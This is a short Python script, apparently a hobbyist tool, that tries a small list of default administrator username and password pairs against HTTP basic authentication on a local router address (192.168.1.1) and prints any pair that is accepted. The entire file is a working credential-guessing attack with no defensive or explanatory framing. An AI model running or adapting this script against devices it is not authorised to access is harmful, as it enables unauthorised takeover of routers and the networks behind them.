import requests

try:
    dic = [("admin", ""), ("admin", "12345"), ("admin", "admin"), ("admin", "11111111111")]
    for userpass in dic:
        req = requests.get("http://192.168.1.1", auth=userpass)
        if req.status_code == 200:
            print ("username is : ", userpass[0])
            print ("password is : ", userpass[1])
        else:
            print (userpass, " didn't match!")
except:
    print ("something is wrong!")
